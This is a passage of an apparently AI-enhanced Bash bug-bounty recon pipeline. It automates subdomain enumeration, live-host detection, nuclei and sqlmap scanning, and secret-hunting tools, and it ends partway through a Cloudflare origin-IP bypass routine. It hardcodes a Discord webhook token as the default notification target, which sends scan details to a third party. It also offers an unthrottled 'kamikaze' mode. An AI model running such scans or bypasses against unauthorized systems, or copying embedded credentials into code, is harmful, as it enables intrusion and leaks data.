#!/usr/bin/env bash
# bugbounty_scanner_enhanced.sh
# Enhanced automated bug-bounty reconnaissance & scanning pipeline
# MELHORADO COM PERFIS INTERATIVOS + CONTROLES DE SEGURANÇA
# Target platform: Kali Linux / Security distributions
# Author:Kirby656 & Enhanced by AI Assistant
# License: Use only on targets you are authorized to test.

# ============= AVISOS DE SEGURANÇA E ÉTICA =============
# ⚠️  IMPORTANTE: Use apenas em alvos autorizados para teste
# ⚠️  Para perfis agressivos, use VPS dedicado (não rede doméstica)  
# ⚠️  Monitore logs e ajuste rate limits conforme necessário
# ⚠️  Dry-run habilitado por padrão - use --confirm para ações ativas
# ⚠️  Toda atividade de scanning deve ter autorização prévia

set -euo pipefail
IFS=$'\n\t'

# ============= SISTEMA DE PERFIS E CONFIGURAÇÕES =============
# Parse command line arguments
PROFILE=""
DRY_RUN=true
SKIP_CONFIRMATION=false
EXPORT_JSON=false

# Parse argumentos da linha de comando
while [[ $# -gt 0 ]]; do
    case $1 in
        --profile=*)
            PROFILE="${1#*=}"
            shift
            ;;
        --confirm|--no-dry-run)
            DRY_RUN=false
            shift
            ;;
        --yes)
            SKIP_CONFIRMATION=true
            shift
            ;;
        --dry-run)
            DRY_RUN=true
            shift
            ;;
        --export-json)
            EXPORT_JSON=true
            shift
            ;;
        --help)
            echo "Usage: $0 [options] scope.txt"
            echo "Options:"
            echo "  --profile=PROFILE    Set profile: light, balanced, aggressive"
            echo "  --confirm            Disable dry-run mode (enable active scanning)"
            echo "  --dry-run            Enable dry-run mode (default)"
            echo "  --yes                Skip confirmation prompts"
            echo "  --export-json        Export results in JSON format"
            exit 0
            ;;
        -*)
            echo "Unknown option: $1" >&2
            exit 1
            ;;
        *)
            SCOPE_FILE="$1"
            shift
            ;;
    esac
done

# ============= PROMPT INTERATIVO DE PERFIS =============
show_profile_menu() {
    echo ""
    echo "🎯 Selecione o perfil de execução:"
    echo ""
    echo "1) light      - Seguro para rede doméstica (baixo impacto)"
    echo "   • Concorrência: 8 threads"
    echo "   • Rate limit: 20/s"
    echo "   • Timeouts conservadores"
    echo ""
    echo "2) balanced   - Recomendado para VM 8GB/4cores (padrão)" 
    echo "   • Concorrência: 20 threads"
    echo "   • Rate limit: 100/s"  
    echo "   • Timeouts médios"
    echo ""
    echo "3) aggressive - Somente VPS dedicado (alto paralelismo)"
    echo "   • Concorrência: 50 threads"
    echo "   • Rate limit: 300/s"
    echo "   • Timeouts agressivos"
    echo ""
    echo -n "Escolha [1-3] ou [light/balanced/aggressive] (Enter = balanced): "
}

# Configurar perfil interativamente se necessário
if [[ -z "$PROFILE" ]]; then
    # Usar variável de ambiente se disponível
    PROFILE="${PROFILE:-}"
    
    # Se ainda não definido e rodando em TTY, mostrar menu
    if [[ -z "$PROFILE" ]] && [[ -t 0 ]] && [[ -t 1 ]]; then
        show_profile_menu
        read -r user_input
        
        case "$user_input" in
            1|light)
                PROFILE="light"
                ;;
            2|balanced|"")
                PROFILE="balanced"
                ;;
            3|aggressive)
                PROFILE="aggressive"
                ;;
            *)
                echo "❌ Opção inválida. Usando 'balanced' como padrão."
                PROFILE="balanced"
                ;;
        esac
    fi
fi

# Definir padrão se ainda não configurado
PROFILE="${PROFILE:-balanced}"

# ============= CONFIGURAÇÃO DOS PERFIS =============
configure_profile() {
    case "$PROFILE" in
        light)
            CONCURRENCY=8
            PARALLEL_HOSTS=2
            RATE_LIMIT=20
            TIMEOUT_PER_HOST="20s"
            NUCLEI_FLAGS="-c 5 -rate-limit 20 -timeout 5"
            MAX_CRAWL_DEPTH=1
            MAX_JS_FILES=20
            NCPU=2
            NAABU_TOP_PORTS=100
            SQLMAP_LEVEL=1
            SQLMAP_RISK=1
            MASSCAN_RATE=300  # Rate conservador masscan
            ;;
        balanced)
            CONCURRENCY=35
            PARALLEL_HOSTS=6
            RATE_LIMIT=200
            TIMEOUT_PER_HOST="90s"
            NUCLEI_FLAGS="-c 40 -rate-limit 200 -timeout 12"
            MAX_CRAWL_DEPTH=6
            MAX_JS_FILES=200
            NCPU=$(nproc 2>/dev/null || echo 6)
            NAABU_TOP_PORTS=1000
            SQLMAP_LEVEL=4
            SQLMAP_RISK=2
            MASSCAN_RATE=800  # Rate seguro para masscan
            ;;
        aggressive)
            CONCURRENCY=150
            PARALLEL_HOSTS=30
            RATE_LIMIT=800
            TIMEOUT_PER_HOST="180s"
            NUCLEI_FLAGS="-c 150 -rate-limit 800 -timeout 18"
            MAX_CRAWL_DEPTH=8
            MAX_JS_FILES=800
            NCPU=$(nproc 2>/dev/null || echo 16)
            NAABU_TOP_PORTS=full
            SQLMAP_LEVEL=5
            SQLMAP_RISK=3
            MASSCAN_RATE=2000  # Rate máximo masscan
            ;;
        kamikaze)
            # MODO KAMIKAZE - MÁXIMA BRUTALIDADE (USE COM CUIDADO!)
            CONCURRENCY=250
            PARALLEL_HOSTS=80
            RATE_LIMIT=1500
            TIMEOUT_PER_HOST="400s"
            NUCLEI_FLAGS="-c 250 -rate-limit 1500 -timeout 25"
            MAX_CRAWL_DEPTH=12
            MAX_JS_FILES=1500
            NCPU=$(nproc 2>/dev/null || echo 32)
            NAABU_TOP_PORTS=full
            SQLMAP_LEVEL=5
            SQLMAP_RISK=3
            MASSCAN_RATE=5000  # Rate kamikaze masscan
            # Desabilitar ALL rate limits
            ulimit -n 65535 2>/dev/null || true
            ;;
        *)
            echo "❌ Perfil desconhecido: $PROFILE"
            exit 1
            ;;
    esac
}

# Configurar perfil selecionado
configure_profile

# defaults (podem vir do topo do script / PROFILE)
CONCURRENCY="${CONCURRENCY:-20}"      # padrão balanced
RATE_LIMIT="${RATE_LIMIT:-100}"
NUCLEI_TIMEOUT_SECONDS="${NUCLEI_TIMEOUT_SECONDS:-7}"

# pegar help do nuclei (sem caracteres estranhos)
unalias nuclei 2>/dev/null || true
NUCLEI_HELP="$(nuclei -h 2>&1 || true)"
# fallback se nuclei não instalado: NUCLEI_HELP vazio

# detectar flags suportadas
NUCLEI_CONC_FLAG=""
NUCLEI_RL_FLAG=""
NUCLEI_TO_FLAG=""

if grep -qE '(^|[[:space:]])(-concurrency|--concurrency)([[:space:]]|$)' <<<"$NUCLEI_HELP"; then
  NUCLEI_CONC_FLAG="-concurrency"
elif grep -qE '(^|[[:space:]])(-c[[:space:]]| -c$| -c,|^ -c)' <<<"$NUCLEI_HELP"; then
  NUCLEI_CONC_FLAG="-c"
fi

if grep -qE '(^|[[:space:]])(-rl|--rate-limit|--rl)([[:space:]]|$)' <<<"$NUCLEI_HELP"; then
  # some versions use -rl, some use -rate-limit
  if grep -qE '(^|[[:space:]])-rl([[:space:]]|$)' <<<"$NUCLEI_HELP"; then
    NUCLEI_RL_FLAG="-rl"
  else
    NUCLEI_RL_FLAG="-rate-limit"
  fi
fi

if grep -qE '(^|[[:space:]])(-timeout|--timeout)([[:space:]]|$)' <<<"$NUCLEI_HELP"; then
  NUCLEI_TO_FLAG="-timeout"
fi

# Build an array of nuclei args (safe splitting, no quoting issues)
build_nuclei_args() {
  local -n _arr=$1   # name ref to return array
  _arr=()

  # allow override via env var NUCLEI_FLAGS_PRESET (string) if user set it
  if [[ -n "${NUCLEI_FLAGS_PRESET:-}" ]]; then
    read -r -a preset_tokens <<< "${NUCLEI_FLAGS_PRESET}"
    for t in "${preset_tokens[@]}"; do
      _arr+=("$t")
    done
  else
    # add concurrency if supported
    if [[ -n "$NUCLEI_CONC_FLAG" ]]; then
      _arr+=("$NUCLEI_CONC_FLAG" "$CONCURRENCY")
    fi
    # add rate limit if supported
    if [[ -n "$NUCLEI_RL_FLAG" ]]; then
      _arr+=("$NUCLEI_RL_FLAG" "$RATE_LIMIT")
    fi
    # add timeout if supported (nuclei supports seconds or duration)
    if [[ -n "$NUCLEI_TO_FLAG" ]]; then
      _arr+=("$NUCLEI_TO_FLAG" "$NUCLEI_TIMEOUT_SECONDS")
    fi
  fi

  # Don't add -silent automatically to allow verbose output
  # _arr+=("-silent")
}

# Build extended flags array (if you want different presets for extended runs)
build_nuclei_args NUCLEI_ARGS
NUCLEI_FLAGS_EXT_PRESET="${NUCLEI_FLAGS_EXT_PRESET:-}"
if [[ -n "$NUCLEI_FLAGS_EXT_PRESET" ]]; then
  read -r -a tmp <<< "$NUCLEI_FLAGS_EXT_PRESET"
  NUCLEI_ARGS_EXT=("${tmp[@]}")
else
  NUCLEI_ARGS_EXT=("${NUCLEI_ARGS[@]}")
fi

# ============= CONFIGURAÇÕES ADICIONAIS =============
OUTDIR="results_$(date +%Y%m%d_%H%M%S)"
SCOPE_FILE="${SCOPE_FILE:-}"
CHAOS_KEY=${CHAOS_KEY:-""}
SAVE_JS=true
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
THROTTLE_CMD="${THROTTLE_CMD:-}"

# Timeouts/limites específicos (configuráveis via env)
TIMEOUT_PER_CALL="${TIMEOUT_PER_CALL:-60s}"  # timeout por URL no download de JS

# TELEGRAM CONFIG
TELEGRAM_BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-}"
TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID:-}"
INSTANCE_ID="$(hostname)_$$_$(date +%s%N | cut -b1-13)"
TELEGRAM_QUEUE_DIR="/tmp/telegram_queue_${USER:-root}"
TELEGRAM_LAST_SEND_FILE="/tmp/telegram_last_send_${USER:-root}"

# DISCORD CONFIG
DISCORD_WEBHOOK="${DISCORD_WEBHOOK:-https://discord.com/api/webhooks/1423586545562026005/Z8H0aW-DOd0M29nCNfIjgFSfL7EQVTUZwdFo07_UV4iUwMj8SSybO8JxC_GvkRfpkhP-}"
DISCORD_LAST_SEND_FILE="/tmp/discord_last_send_${USER:-root}"

# Mostrar configuração selecionada
echo ""
echo "🔧 Configuração selecionada:"
echo "   Perfil: $PROFILE"
echo "   Concorrência: $CONCURRENCY"
echo "   Hosts paralelos: $PARALLEL_HOSTS"
echo "   Rate limit: $RATE_LIMIT/s"
echo "   Timeout por host: $TIMEOUT_PER_HOST"
echo "   Max JS files: $MAX_JS_FILES"
echo "   CPUs: $NCPU"
echo "   Modo: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (apenas coleta)" || echo "ATIVO (scanning completo)")"
echo ""

# ============= CONFIRMAÇÃO FINAL =============
if [[ "$DRY_RUN" = "false" ]] && [[ "$SKIP_CONFIRMATION" = "false" ]]; then
    echo "⚠️  ATENÇÃO: Modo ATIVO selecionado!"
    echo "   Isso executará varreduras ativas (nuclei, naabu, sqlmap, etc.)"
    echo "   Certifique-se de ter autorização para testar os alvos."
    echo ""
    echo -n "Continuar com scanning ativo? [y/N]: "
    read -r confirmation
    
    if [[ ! "$confirmation" =~ ^[Yy]$ ]]; then
        echo "❌ Cancelado pelo usuário."
        exit 0
    fi
fi

# ============= FERRAMENTAS APRIMORADAS =============
# Função para detectar getJS com variações de nome e PATH - Correção: movida para antes de check_tools()
detect_getjs() {
    local getjs_bin=""
    
    # Tentar diferentes variações do nome do binário
    for variant in getJS getjs GetJS GetJs; do
        if command -v "$variant" >/dev/null 2>&1; then
            getjs_bin="$variant"
            break
        fi
    done
    
    # Se não encontrou, verificar em $GOPATH/bin
    if [[ -z "$getjs_bin" ]] && [[ -n "$GOPATH" ]]; then
        for variant in getJS getjs GetJS GetJs; do
            if [[ -x "$GOPATH/bin/$variant" ]]; then
                getjs_bin="$GOPATH/bin/$variant"
                break
            fi
        done
    fi
    
    # Verificar também /usr/local/bin
    if [[ -z "$getjs_bin" ]]; then
        for variant in getJS getjs GetJS GetJs; do
            if [[ -x "/usr/local/bin/$variant" ]]; then
                getjs_bin="/usr/local/bin/$variant"
                break
            fi
        done
    fi
    
    echo "$getjs_bin"
}

REQUIRED_TOOLS=(subfinder httpx nuclei jq curl wget)
OPTIONAL_TOOLS=(amass findomain naabu gau waybackurls hakrawler katana gf qsreplace dalfox sqlmap gospider getjs aria2c massdns subjack wafw00f)
# Removido: ffuf dirsearch gobuster (bruteforce tools - contra princípios de bug bounty)

# ============= EXTRA TOOLS ARRAY - MODO BRUTAL =============
EXTRA_TOOLS=(
    kxss linkfinder paramspider arjun 
    secretfinder trufflehog gitleaks git-dumper commix 
    lfisuite smuggler ssrfmap httprobe gowitness aquatone 
    s3scanner cloud_enum wafw00f
)

check_tools() {
    local missing_required=()
    local missing_optional=()
    
    echo "🔍 Verificando ferramentas..."
    
    for tool in "${REQUIRED_TOOLS[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_required+=("$tool")
        fi
    done
    
    for tool in "${OPTIONAL_TOOLS[@]}"; do
        # Correção: tratar getjs especialmente usando detecção melhorada
        if [[ "$tool" == "getjs" ]]; then
            if [[ -z "$(detect_getjs)" ]]; then
                missing_optional+=("$tool")
            fi
        elif ! command -v "$tool" >/dev/null 2>&1; then
            missing_optional+=("$tool")
        fi
    done
    
    if [[ ${#missing_required[@]} -gt 0 ]]; then
        echo "❌ Ferramentas obrigatórias faltando: ${missing_required[*]}"
        echo "   Instale e execute novamente."
        exit 1
    fi
    
    if [[ ${#missing_optional[@]} -gt 0 ]]; then
        echo "⚠️  Ferramentas opcionais faltando: ${missing_optional[*]}"
        echo "   Continuando sem elas..."
    fi
    
    echo "✅ Verificação de ferramentas completa"
}

check_tools

# Validate scope file
if [[ -z "$SCOPE_FILE" ]] || [[ ! -f "$SCOPE_FILE" ]]; then
    echo "Usage: $0 [options] scope.txt"
    echo "scope.txt deve conter um domínio por linha (exemplo.com)" >&2
    exit 1
fi

# ============= ESTRUTURA DE DIRETÓRIOS MELHORADA =============
setup_directories() {
    mkdir -p "$OUTDIR"
    cd "$OUTDIR" || exit 1
    
    # Criar estrutura completa de diretórios incluindo para EXTRA_TOOLS e Burp Suite
    mkdir -p raw subs alive tech ports urls js js/downloads nuclei nuclei/burp_scan poc poc/notes reports html logs apis secrets endpoints
    mkdir -p logs/{subdomain,httpx,nuclei,sqlmap,crawling,extra_tools,xss,burp}
    mkdir -p reports/{kxss,linkfinder,paramspider,arjun,secretfinder,trufflehog,gitleaks,git_dumper,commix,lfisuite,smuggler,ssrfmap,httprobe,gowitness,aquatone,s3scanner,cloud_enum}
    mkdir -p screenshots/{gowitness,aquatone}
    
    cp "$OLDPWD/$SCOPE_FILE" scope.txt
    
    echo "📁 Estrutura de diretórios criada em: $(pwd)"
}

setup_directories

# ============= FUNÇÕES UTILITÁRIAS MELHORADAS =============
safe_count() {
    local file="$1"
    if [[ -f "$file" ]] && [[ -s "$file" ]]; then
        wc -l < "$file" | tr -d ' \n'
    else
        echo "0"
    fi
}

log_info() {
    local message="$*"
    echo "[$(date '+%H:%M:%S')] $message" | tee -a logs/scanner.log
}

log_error() {
    local message="$*" 
    echo "[$(date '+%H:%M:%S')] ERROR: $message" >&2 | tee -a logs/errors.log
}

log_warn() {
    local message="$*"
    echo "[$(date '+%H:%M:%S')] ⚠️  $message" | tee -a logs/scanner.log
}

log_success() {
    local message="$*"
    echo "[$(date '+%H:%M:%S')] ✅ $message" | tee -a logs/scanner.log
}

# ============= FUNÇÕES DO TELEGRAM APRIMORADAS =============
init_telegram_queue() {
    mkdir -p "$TELEGRAM_QUEUE_DIR" 2>/dev/null || true
    touch "$TELEGRAM_LAST_SEND_FILE" 2>/dev/null || true
}

telegram_rate_limit() {
    local min_interval=2
    local last_send=0
    
    if [[ -f "$TELEGRAM_LAST_SEND_FILE" ]]; then
        last_send=$(cat "$TELEGRAM_LAST_SEND_FILE" 2>/dev/null || echo 0)
    fi
    
    local current_time=$(date +%s)
    local time_diff=$((current_time - last_send))
    
    if [[ "$time_diff" -lt "$min_interval" ]]; then
        local sleep_time=$((min_interval - time_diff + 1))
        sleep "$sleep_time"
    fi
    
    echo "$current_time" > "$TELEGRAM_LAST_SEND_FILE" 2>/dev/null || true
}

send_telegram_message_enhanced() {
    local message="$1"
    local urgent="${2:-false}"
    local max_retries=3
    local retry_count=0
    
    if [[ -z "$TELEGRAM_BOT_TOKEN" ]] || [[ -z "$TELEGRAM_CHAT_ID" ]]; then
        return 0
    fi
    
    # Rate limiting
    telegram_rate_limit
    
    # Add instance identifier
    local instance_suffix="
🔧 Instance: \`${INSTANCE_ID:0:8}...\`"
    local formatted_message="$message$instance_suffix"
    
    while [[ "$retry_count" -lt "$max_retries" ]]; do
        if curl -s -m 15 -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
             -d chat_id="${TELEGRAM_CHAT_ID}" \
             -d parse_mode="Markdown" \
             -d text="$formatted_message" >/dev/null 2>&1; then
            return 0
        fi
        
        retry_count=$((retry_count + 1))
        log_error "Telegram send failed (attempt $retry_count/$max_retries)"
        
        local backoff=$(( (2 ** retry_count) + (RANDOM % 3) ))
        sleep "$backoff"
    done
    
    log_error "Failed to send Telegram message after $max_retries attempts"
    return 0
}

send_telegram_status() {
    local message="$1"
    local urgent="${2:-false}"
    
    if [[ -n "$TELEGRAM_BOT_TOKEN" ]] && [[ -n "$TELEGRAM_CHAT_ID" ]]; then
        local emoji="📊"
        [[ "$urgent" = "true" ]] && emoji="🚨"
        
        local formatted_message="${emoji} *Bug Bounty Scanner*
📁 \`$(basename "$(pwd)")\`
🕐 \`$(date '+%H:%M:%S')\`
🔧 Perfil: \`$PROFILE\` $([ "$DRY_RUN" = "true" ] && echo "(DRY-RUN)" || echo "(ATIVO)")

$message"
        
        send_telegram_message_enhanced "$formatted_message" "$urgent"
    fi
}

# ============= FUNÇÕES DO DISCORD =============
init_discord() {
    touch "$DISCORD_LAST_SEND_FILE" 2>/dev/null || true
}

discord_rate_limit() {
    local min_interval=2
    local last_send=0
    
    if [[ -f "$DISCORD_LAST_SEND_FILE" ]]; then
        last_send=$(cat "$DISCORD_LAST_SEND_FILE" 2>/dev/null || echo 0)
    fi
    
    local current_time=$(date +%s)
    local time_diff=$((current_time - last_send))
    
    if [[ "$time_diff" -lt "$min_interval" ]]; then
        local sleep_time=$((min_interval - time_diff + 1))
        sleep "$sleep_time"
    fi
    
    echo "$current_time" > "$DISCORD_LAST_SEND_FILE" 2>/dev/null || true
}

send_discord_message() {
    local message="$1"
    local urgent="${2:-false}"
    local max_retries=3
    local retry_count=0
    
    if [[ -z "$DISCORD_WEBHOOK" ]]; then
        return 0
    fi
    
    # Rate limiting
    discord_rate_limit
    
    # Add instance identifier
    local formatted_message="$message

🔧 Instance: \`${INSTANCE_ID:0:8}...\`"
    
    # Determinar cor do embed (verde, amarelo, vermelho)
    local color="3447003"  # Azul padrão
    [[ "$urgent" = "true" ]] && color="15158332"  # Vermelho
    
    local json_payload=$(jq -n \
        --arg content "$formatted_message" \
        --arg color "$color" \
        '{
            "content": $content,
            "embeds": [{
                "color": ($color | tonumber),
                "timestamp": (now | strftime("%Y-%m-%dT%H:%M:%S.000Z"))
            }]
        }')
    
    while [[ "$retry_count" -lt "$max_retries" ]]; do
        if curl -s -m 15 -X POST "$DISCORD_WEBHOOK" \
             -H "Content-Type: application/json" \
             -d "$json_payload" >/dev/null 2>&1; then
            return 0
        fi
        
        retry_count=$((retry_count + 1))
        log_error "Discord send failed (attempt $retry_count/$max_retries)"
        
        local backoff=$(( (2 ** retry_count) + (RANDOM % 3) ))
        sleep "$backoff"
    done
    
    log_error "Failed to send Discord message after $max_retries attempts"
    return 0
}

send_discord_status() {
    local message="$1"
    local urgent="${2:-false}"
    
    if [[ -n "$DISCORD_WEBHOOK" ]]; then
        local emoji="📊"
        [[ "$urgent" = "true" ]] && emoji="🚨"
        
        local formatted_message="${emoji} **Bug Bounty Scanner**
📁 \`$(basename "$(pwd)")\`
🕐 \`$(date '+%H:%M:%S')\`
🔧 Perfil: \`$PROFILE\` $([ "$DRY_RUN" = "true" ] && echo "(DRY-RUN)" || echo "(ATIVO)")

$message"
        
        send_discord_message "$formatted_message" "$urgent"
    fi
}

send_notification() {
    local message="$1"
    local urgent="${2:-false}"
    
    # Enviar para ambos os canais se configurados
    send_telegram_status "$message" "$urgent"
    send_discord_status "$message" "$urgent"
}

# ============= PROCESSAMENTO DE ESCOPO MELHORADO =============
process_scope() {
    log_info "Processando escopo e tratando wildcards..."
    while read -r line; do
        # Skip comments and empty lines
        [[ "$line" =~ ^[[:space:]]*# ]] && continue
        [[ -z "${line// }" ]] && continue
        
        line=$(echo "$line" | tr '[:upper:]' '[:lower:]' | sed 's/[[:space:]]*$//')
        
        # Handle wildcards
        if [[ "$line" =~ \* ]]; then
            log_info "Wildcard detectado: $line - Convertendo para domínio base"
            base_domain=$(echo "$line" | sed 's/.*\*\.//g')
            if [[ "$base_domain" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
                echo "$base_domain"
                log_info "Convertido wildcard $line para: $base_domain"
            else
                log_error "Formato inválido de wildcard: $line - ignorando"
            fi
        else
            # Validate normal domain
            if [[ "$line" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
                echo "$line"
            else
                log_error "Formato inválido de domínio: $line - ignorando"
            fi
        fi
    done < scope.txt
}

# Initialize Telegram and Discord
init_telegram_queue
init_discord

# ============= INÍCIO DO SCANNER =============
send_notification "🚀 *INICIANDO SCAN*
🎯 Escopo: \`$(basename "$SCOPE_FILE")\`
📍 Diretório: \`$OUTDIR\`
⚙️ Configurações:
- Perfil: $PROFILE
- Threads: $CONCURRENCY
- Rate Limit: $RATE_LIMIT/s
- Depth: $MAX_CRAWL_DEPTH
- Modo: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ATIVO")"

# Processar escopo
process_scope | sort -u > raw/scope.clean.txt

log_info "Output dir: $(pwd)"
log_info "Domínios válidos processados: $(safe_count raw/scope.clean.txt)"

# Verificar se temos domínios válidos
if [[ ! -s raw/scope.clean.txt ]]; then
    log_error "Nenhum domínio válido encontrado no escopo!"
    send_notification "❌ *ERRO CRÍTICO*
Nenhum domínio válido encontrado no escopo!" true
    exit 1
fi

TOTAL_DOMAINS=$(safe_count raw/scope.clean.txt)
send_notification "✅ *Escopo processado*
📋 $TOTAL_DOMAINS domínios válidos encontrados"

# ============= FASE 1: ENUMERAÇÃO DE SUBDOMÍNIOS MELHORADA =============
echo ""
echo "========== FASE 1: ENUMERAÇÃO DE SUBDOMÍNIOS =========="
send_notification "🔍 *FASE 1: SUBDOMAIN ENUMERATION*
Iniciando descoberta com múltiplas ferramentas..."

subdomain_enumeration() {
    log_info "Iniciando enumeração de subdomínios..."
    
    # Subfinder com MÁXIMAS SOURCES + API keys if available
    if command -v subfinder >/dev/null 2>&1; then
        log_info "Executando subfinder com TODAS as sources disponíveis..."
        timeout 20m subfinder -dL raw/scope.clean.txt \
            -all -recursive -max-time 20 \
            -sources certspotter,crtsh,hackertarget,threatcrowd,virustotal,chaos,rapiddns,alienvault,binaryedge,bufferover,c99,censys,chinaz,commoncrawl,dnsdumpster,dnsdb,fofa,fullhunt,github,google,hunter,intelx,passivetotal,quake,riddler,securitytrails,shodan,sitedossier,sublist3r,threatbook,urlscan,waybackarchive,whoisxmlapi,zoomeye \
            -silent -o raw/subfinder.txt 2>/dev/null || true &
    fi
    
    # Amass PASSIVE ONLY (sem bruteforce para respeitar princípios de bug bounty)
    if command -v amass >/dev/null 2>&1; then
        log_info "Executando amass (passive only - sem bruteforce)..."
        # Passive apenas
        timeout 20m amass enum -passive -df raw/scope.clean.txt -o raw/amass_passive.txt 2>/dev/null || true &
        
        # Active mode SEM bruteforce (apenas se não for dry-run)
        if [[ "$DRY_RUN" = "false" ]]; then
            timeout 40m amass enum -active \
                -df raw/scope.clean.txt \
                -max-dns-queries 10000 \
                -o raw/amass_active.txt 2>/dev/null || true &
        fi
    fi
    
    # Assetfinder - Descoberta adicional
    if command -v assetfinder >/dev/null 2>&1; then
        log_info "Executando assetfinder..."
        timeout 10m cat raw/scope.clean.txt | assetfinder --subs-only > raw/assetfinder.txt 2>/dev/null || true &
    fi
    
    # Findomain
    if command -v findomain >/dev/null 2>&1; then
        log_info "Executando findomain..."
        timeout 5m findomain -tL raw/scope.clean.txt -u raw/findomain.txt 2>/dev/null || true &
    fi
    
    # Chaos (se disponível)
    if [[ -n "$CHAOS_KEY" ]] && command -v chaos >/dev/null 2>&1; then
        log_info "Executando chaos..."
        timeout 10m chaos -l raw/scope.clean.txt -o raw/chaos.txt 2>/dev/null || true &
    fi
    
    # crt.sh via curl
    log_info "Consultando crt.sh..."
    while read -r domain; do
        curl -s "https://crt.sh/?q=%.${domain}&output=json" 2>/dev/null | \
        jq -r '.[].name_value' 2>/dev/null | \
        sed 's/\*\.//g' | sort -u >> raw/crtsh.txt || true &
    done < raw/scope.clean.txt
    
    wait  # Esperar todos terminarem
    
    # Juntar e limpar duplicados
    cat raw/*.txt 2>/dev/null \
      | sed 's/^\s*//; s/\s*$//' \
      | grep -Eo "([a-zA-Z0-9][a-zA-Z0-9\.-]+\.[a-zA-Z]{2,})" \
      | sort -u > subs/all_subs.txt
}

subdomain_enumeration

SUBS_FOUND=$(safe_count subs/all_subs.txt)
log_info "Subdomínios encontrados: $SUBS_FOUND"

# Verificar se temos subdomínios
if [[ ! -s subs/all_subs.txt ]]; then
    log_error "Nenhum subdomínio encontrado!"
    cp raw/scope.clean.txt subs/all_subs.txt
    SUBS_FOUND=$(safe_count subs/all_subs.txt)
fi

send_notification "✅ *FASE 1 COMPLETA*
🌐 $SUBS_FOUND subdomínios encontrados
📊 Expansão: $(echo "scale=2; $SUBS_FOUND / $TOTAL_DOMAINS" | bc 2>/dev/null || echo "N/A")x"

# ============= FASE 2: DETECÇÃO DE HOSTS VIVOS & WAF DETECTION ========== 
echo ""
echo "========== FASE 2: DETECÇÃO DE HOSTS VIVOS & TECNOLOGIAS & WAF =========="
send_notification "🔍 *FASE 2: LIVE HOST DETECTION & WAF*
Testando $SUBS_FOUND hosts com httpx e wafw00f..."

# ============= WAF DETECTION FUNCTION =============
waf_detection() {
    if command -v wafw00f >/dev/null 2>&1 && [[ -s alive/hosts.txt ]]; then
        log_info "🛡️ Executando WAF detection com wafw00f..."
        mkdir -p tech logs
        
        local max_hosts=50
        [[ "$PROFILE" = "light" ]] && max_hosts=20
        [[ "$PROFILE" = "aggressive" ]] && max_hosts=100
        
        head -n "$max_hosts" alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
            safe=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g')
            
            timeout 30s wafw00f "$url" -o tech/waf_${safe}.txt 2>>logs/wafw00f_errors.log || true
        done
        
        # Consolidar resultados
        if ls tech/waf_*.txt >/dev/null 2>&1; then
            cat tech/waf_*.txt | grep -E "is behind|protected by" > tech/waf_summary.txt 2>/dev/null || true
            
            # Contar WAFs detectados
            local waf_count=$(grep -c "is behind" tech/waf_summary.txt 2>/dev/null || echo "0")
            waf_count=$(echo "$waf_count" | tr -d '\n' | tr -d ' ')
            
            if [[ "${waf_count:-0}" -gt 0 ]]; then
                log_info "⚠️  $waf_count WAFs detectados! Revise tech/waf_summary.txt"
                send_notification "🛡️ *WAF DETECTION*
🚨 $waf_count Web Application Firewalls detectados!
📄 Detalhes em: tech/waf_summary.txt
💡 Considere bypass techniques para esses alvos" "true"
            else
                log_info "✅ Nenhum WAF detectado nos alvos testados"
            fi
        fi
    else
        log_info "wafw00f não instalado - pulando WAF detection"
        log_info "💡 Instale com: sudo apt install wafw00f (ou pipx install wafw00f)"
    fi
}

# ============= CLOUDFLARE BYPASS AVANÇADO =============
cloudflare_bypass() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host para bypass de Cloudflare"
        return 0
    fi
    
    log_info "🔥 Iniciando técnicas de Cloudflare bypass..."
    mkdir -p reports/cloudflare_bypass
    
    # 1. CloudFlair - DNS History Mining
    if command -v cloudflair >/dev/null 2>&1; then
        log_info "[CF Bypass] Executando CloudFlair..."
        head -5 alive/hosts_only.txt | while read -r domain; do
            timeout 60s cloudflair "$domain" 2>/dev/null >> reports/cloudflare_bypass/cloudflair_results.txt || true
        done
    fi
    
    # 2. CrimeFlare Database
    log_info "[CF Bypass] Consultando CrimeFlare database..."
    head -5 alive/hosts_only.txt | while read -r domain; do
        curl -s "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi" -d "cfS=$domain" 2>/dev/null >> reports/cloudflare_bypass/crimeflare_results.txt || true
    done
    
    # 3. DNS History via ViewDNS
    log_info "[CF Bypass] Verificando DNS history..."
    head -5 alive/hosts_only.txt | while read -r domain; do
        curl -s "https://viewdns.info/iphistory/?domain=$domain" 2>/dev/null >> reports/cloudflare_bypass/dns_history.txt || true
    done
    
    # 4. Testar subdomínios comuns desprotegidos
    log_info "[CF Bypass] Testando subdomínios desprotegidos..."
    head -5 alive/hosts_only.txt | while read -r domain; do
        for prefix in origin direct ftp admin dev test staging; do
            dig +short "${prefix}.${domain}" 2>/dev/null >> reports/cloudflare_bypass/unprotected_subs.txt || true
        done
    done
    
    # 5. Shodan search (se disponível)
    if command -v shodan >/dev/null 2>&1; then
        log_info "[CF Bypass] Pesquisando no Shodan..."
        head -3 alive/hosts_only.txt | while read -r domain; do
            timeout 30s shodan search "hostname:$domain" 2>/dev/null >> reports/cloudflare_bypass/shodan_results.txt || true
        done
    fi
    
    # 6. SSL Certificate Lookup via crt.sh
    log_info "[CF Bypass] Consultando certificados SSL..."
    head -5 alive/hosts_only.txt | while read -r domain; do
        curl -s "https://crt.sh/?q=%.${domain}&output=json" 2>/dev/null | \
            jq -r '.[].name_value' 2>/dev/null | sort -u >> reports/cloudflare_bypass/ssl_certs.txt || true
    done
    
    # 7. Wayback Machine CDN History
    log_info "[CF Bypass] Verificando Wayback Machine..."
    head -5 alive/hosts_only.txt | while read -r domain; do
